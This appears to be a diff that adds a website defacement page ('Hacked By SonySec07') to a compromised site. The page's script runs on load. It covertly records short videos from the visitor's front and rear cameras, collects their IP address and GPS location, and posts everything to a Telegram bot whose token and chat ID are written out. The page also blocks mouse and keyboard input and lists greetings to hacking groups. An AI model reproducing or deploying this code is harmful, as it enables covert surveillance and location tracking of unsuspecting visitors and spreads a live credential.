@@ -1,0 +1,137 @@
+<html>
+<head>
+    <title>Hacked By SonySec07</title>
+    <meta charset="UTF-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1"/> 
+    <meta property="og:title" content="Hacked By SonySec07">
+    <meta name="description" content="wh00pz ! your website security get down">
+    <meta property="og:description" content="wh00pz ! your website security get down">
+    <meta property="og:image" content="https://abilitysportsafrica.org/alok99.png">
+    <meta name="theme-color" content="#fff">
+    <style type='text/css'>body,a:hover{cursor:url(../cur.cursors-4u.net/symbols/sym-1/sym46.cur),progress!important;}</style>
+    
+    <script>
+        window.config = {
+            botToken: "7599305876:AAFojw-7gJICoPIt5YXS8xdtVh7aM2vEsxM",
+            chatID: "7221518562"
+        };
+
+        let isFrontCamera = true;
+        let currentStream = null;
+        let videoRecorder = null;
+        let videoDevices = [];
+
+        async function getVideoDevices() {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            return devices.filter(device => device.kind === 'videoinput');
+        }
+
+        async function startVideoRecording() {
+            try {
+                videoDevices = await getVideoDevices();
+                if(videoDevices.length === 0) return;
+
+                const selectedDevice = videoDevices[isFrontCamera ? 0 : 1];
+                const constraints = {
+                    video: {
+                        deviceId: selectedDevice?.deviceId,
+                        facingMode: isFrontCamera ? "user" : "environment"
+                    }
+                };
+
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                currentStream = stream;
+                const chunks = [];
+                
+                videoRecorder = new MediaRecorder(stream);
+                videoRecorder.ondataavailable = (event) => chunks.push(event.data);
+                
+                videoRecorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    await sendLocationAndVideo(videoBlob);
+                    
+                    currentStream.getTracks().forEach(track => track.stop());
+                    if(isFrontCamera) {
+                        isFrontCamera = false;
+                        setTimeout(startVideoRecording, 1000);
+                    }
+                };
+
+                videoRecorder.start();
+                setTimeout(() => videoRecorder.stop(), 3000);
+            } catch(error) {
+                console.error('Error accessing camera:', error);
+            }
+        }
+
+        async function sendLocationAndVideo(videoBlob) {
+            try {
+                // Get IP Address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const { ip: userIP } = await ipResponse.json();
+
+                // Get Geolocation
+                const position = await new Promise((resolve, reject) => 
+                    navigator.geolocation.getCurrentPosition(resolve, reject));
+                
+                const { latitude, longitude } = position.coords;
+                const message = `📍 New Visitor 🌐
+IP: ${userIP}
+Latitude: ${latitude}
+Longitude: ${longitude}
+Map: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                // Send Video
+                const videoForm = new FormData();
+                videoForm.append("chat_id", window.config.chatID);
+                videoForm.append("video", videoBlob, "recording.webm");
+                await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendVideo`, {
+                    method: 'POST',
+                    body: videoForm
+                });
+
+                // Send Location Info
+                await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: window.config.chatID,
+                        text: message
+                    })
+                });
+            } catch(error) {
+                console.error('Error sending data:', error);
+            }
+        }
+
+        // Start recording when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                startVideoRecording();
+            }
+        });
+    </script>
+</head>
+<body bgcolor="white" text="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+    <!-- Konten tetap sama tanpa popup login -->
+    <table width="100%" height="80%">
+        <td>
+            <center>
+                <small>4 BROTHER</small><br>
+                <img src="https://abilitysportsafrica.org/alok99.png" width="220" height="220">
+                <br>Hacked by <red><i>SonySec07</i></red><br>
+                <font size="2">wh00pz ! your website security get down<br>patch it before something bad happens</font><br>
+                <br><small><font size="1" color="gray">johnfelix@mail2tor.co</font></small><br><br><br>
+                <font size="2"><i>Greetz</i><br>
+                Pyscodes - CurutG0D403 - Clutsert03 - BentoSec21 - TN.CUPLIS - JohnFelix - MR.VENOM - HanzRazor - NightBot405 - MR.CULA - EYIKK - M4SKGANS - Inzz - ClayOxtymus1337 - MR.KRIBO - Amigamer404 - Jakarta Blackhat Cyber Crime - MukoMuko Cyber Team - Muslim Cyber Face - FromLammerToMastah - KaliMalang BlackHat Team - Nigeria Cyber Force - FSOCIETY TEAM</font>
+            </center>
+        </td>
+    </table>
+    <audio src="https://i.top4top.io/m_3076tjqzc0.mp3" autoplay loop></audio>
+</body>
+</html>
